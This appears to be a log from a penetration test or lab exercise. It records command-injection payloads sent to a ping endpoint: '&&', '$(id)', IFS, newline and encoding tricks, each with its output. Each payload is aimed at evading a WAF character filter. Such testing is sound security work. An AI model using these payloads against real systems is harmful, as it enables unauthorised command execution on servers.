ping: id: Name or service not known
technique: URL-encoded newline to inject second command

raw_stdout: {"error":"blocked_by_waf","match":"host=127.0.0.1 -c 1 && id","pattern":"[;&|`$()]"}
technique: Space-separated flag injection with && operator — WAF only blocks [;&|`$()]

raw_stdout: ping: id: Name or service not known
technique: Tab character as command separator instead of semicolon

raw_stdout: ping: 127.0.0.1{IFS}id: Name or service not known
technique: Brace-enclosed IFS without dollar sign to avoid $ block

raw_stdout: {"error":"blocked_by_waf","match":"'host=127.0.0.1 -c 1 -W 1 \\nid'","pattern":"control_char"}
technique: Literal newline in form body to break shell command

raw_stdout: ping: 127.0.0.1%20%2D%63%201%20%26%26%20id: Name or service not known
technique: Double URL-encoded && to slip past pattern matching on raw body

raw_stdout: {"error":"blocked_by_waf","match":"host=127.0.0.1 -c 1 -W 1 -p $(id)","pattern":"[;&|`$()]"}
technique: Using -p flag with $() subshell — tests if $ is actually blocked in context

raw_stdout: {"error":"blocked_by_waf","match":"host=127.0.0.1 -c 1; id #","pattern":"[;&|`$()]"}
technique: Semicolon with trailing comment — WAF pattern [;&|`$()] may not apply to decoded form values
